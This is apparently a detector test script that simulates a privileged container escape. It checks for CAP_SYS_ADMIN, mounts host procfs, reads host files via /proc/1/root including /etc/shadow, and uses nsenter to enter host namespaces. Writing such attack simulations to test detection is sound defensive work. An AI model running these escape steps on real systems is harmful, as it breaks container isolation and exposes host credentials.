#!/bin/bash
# ATTACK 2 — Privileged Container Escape
# A --privileged container mounts host procfs, reads /proc/1/root,
# and uses nsenter to break into the host PID namespace.
set -e

echo "=== ATTACK 2: Privileged Container Escape ==="
echo "PID: $$  Container: $(hostname)"
echo ""

# Check CAP_SYS_ADMIN
CAP_EFF=$(grep CapEff /proc/self/status | awk '{print $2}')
CAP_VAL=$((16#$CAP_EFF))
if (( CAP_VAL & (1 << 21) )); then
    echo "[+] CAP_SYS_ADMIN present — container is privileged"
else
    echo "[-] CAP_SYS_ADMIN not present"
    exit 1
fi

# Step 1: Mount host procfs
echo "[*] Mounting host procfs..."
mkdir -p /tmp/hostproc
if mount -t proc proc /tmp/hostproc 2>/dev/null; then
    echo "[!] Mounted procfs — host PID 1: $(cat /tmp/hostproc/1/cmdline 2>/dev/null | tr '\0' ' ')"
    echo "    Visible host processes: $(ls /tmp/hostproc/ | grep -E '^[0-9]+$' | wc -l)"
    umount /tmp/hostproc 2>/dev/null || true
else
    echo "[-] mount(proc) failed"
fi

# Step 2: Read host files via /proc/1/root
echo "[*] Reading host files via /proc/1/root..."
HOSTNAME=$(cat /proc/1/root/etc/hostname 2>/dev/null)
[ -n "$HOSTNAME" ] && echo "[!] ESCAPED — host hostname: $HOSTNAME"

if cat /proc/1/root/etc/shadow >/dev/null 2>&1; then
    echo "[!] ESCAPED — can read host /etc/shadow ($(wc -l < /proc/1/root/etc/shadow) entries)"
fi

# Step 3: nsenter into host namespaces
echo "[*] Attempting nsenter into host PID 1..."
if command -v nsenter >/dev/null 2>&1; then
    RESULT=$(nsenter -t 1 -m -u -i -n -p -- hostname 2>/dev/null)
    [ -n "$RESULT" ] && echo "[!] ESCAPED — nsenter succeeded: $RESULT"
fi

echo ""
echo "=== Attack complete — check detector for PRIVILEGED-ESCAPE alerts ==="
